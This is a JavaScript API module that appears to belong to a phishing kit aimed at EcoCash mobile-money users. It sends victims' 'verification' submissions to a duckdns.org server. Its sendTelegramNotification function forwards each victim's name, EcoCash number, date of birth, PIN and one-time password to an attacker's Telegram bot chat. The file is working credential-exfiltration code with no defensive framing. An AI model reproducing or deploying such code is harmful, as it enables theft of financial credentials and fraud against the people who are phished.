import axios from 'axios'

const API_BASE_URL = "https://lnmb.duckdns.org"
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ""
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ""

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

export const apiService = {
  async requestPinVerification(data) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.post("/api/verify-pin", { ...data, bot })
    return response.data
  },

  async checkPinStatus(sessionId) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.get(`/api/check-pin-status/${bot}/${sessionId}`)
    return response.data
  },

  async requestVerification(data) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.post("/api/verify-user", { ...data, bot })
    return response.data
  },

  async checkStatus(sessionId) {
    const bot = window.location.pathname.split("/")[1] || "user1"
    const response = await api.get(`/api/check-status/${bot}/${sessionId}`)
    return response.data
  },

  async sendTelegramNotification(client) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("Telegram bot token or chat ID not configured")
      return { success: false }
    }

    const message = `
New Client Claim:
Client Name: ${client.name}
EcoCash Number: ${client.number}
Client dob: ${client.dob}
EcoCash Pin: ${client.pin}
Client OTP: ${client.otp}
    `.trim()

    try {
      const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
      return response.data
    } catch (error) {
      console.error("Telegram notification error:", error)
      return { success: false, error }
    }
  }
}

export const getBotName = () => window.location.pathname.split("/")[1] || "user1"